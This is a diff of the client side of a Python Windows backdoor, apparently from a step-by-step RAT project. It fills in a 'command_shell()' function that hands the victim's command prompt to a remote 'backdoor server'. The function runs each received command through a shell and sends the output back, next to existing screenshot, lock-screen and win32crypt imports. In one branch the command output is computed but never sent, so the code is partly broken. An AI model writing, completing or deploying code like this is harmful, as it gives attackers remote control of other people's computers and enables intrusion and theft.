@@ -10,7 +10,7 @@ End Developing Date:
 
 # Step 1: Import requires libraries
 import socket
-from os import path, environ
+from os import path, environ, getcwd, chdir
 from sys import argv, exit
 import platform
 from time import sleep
@@ -29,6 +29,8 @@ import win32event
 import win32crypt
 
 from winreg import *
+
+from backdoor_server import intBuff
 from miscs.colors import fColors, bColors
 from miscs.string_format import StringFormat
 
@@ -147,9 +149,86 @@ def screenshot(all_screens=True):
 def lock():
     ctypes.windll.user32.LockWorkStation()
 
-
+# Step 35: Define `command_shell()` Function to Hijacking Client Command Prompt
 def command_shell():
-    pass
+    # Get the current directory and send it to server
+    strCurrentDir = str(getcwd())
+    send(str.encode(strCurrentDir))
+
+    while True:
+        # Receive Command from the Backdoor Server
+        strData = decode_utf8(recv(intBuff))
+
+        byteData = b''
+
+        # `goback` Command use for Set current dir and exit from CMD Hijacking
+        if strData == 'goback':
+            chdir(strCurrentDir)
+            break
+
+        # Handling 'cd' || 'chdir' Command
+        elif strData[:2].lower() == 'cd' or strData[:5].lower() == 'chdir':
+
+            # Execute Command and store stdout, stderr and stdin
+            objCommand = subprocess.Popen(
+                strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE ,shell=True)
+
+            # If command runs successfully without any error
+            if (objCommand.stderr.read()).decode('utf-8') == '':
+
+                # Get output of first running command
+                strOutput = (objCommand.stdout.read()).decode('utf-8').splitlines()[0]
+
+                # Change Directory to dir received from the server
+                chdir(strOutput)
+
+                # Create Prompt to send to the Server
+                byteData = str.encode("\n" + str(getcwd()) + ">> ")
+
+        # Handle other Commands received from the server
+        elif len(strData) > 0:
+
+            # Execute Command and store stdout, stderr and stdin
+            objCommand = subprocess.Popen(
+                strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE ,shell=True)
+
+            # Get out stdout and stderr from executed command
+            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode('utf-8', errors='replace')
+
+            byteData = str.encode("\n" + str(getcwd()) + ">> ")
+
+        # Handle if the submited command is wrong
+        else:
+            byteData = b'Error !!'
+
+        # Get len of byteData to send All Bytes to the server
+        strBuffer = str(len(byteData))
+
+        # First Send: Send len of byteData to the server
+        send(str.encode(strBuffer))
+
+        sleep(0.1)
+
+        # Second Send: All Bytes of stdout+stderr to the server
+        send(byteData)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 # Define `MessageBox()` Function to Show Received Message from the Server
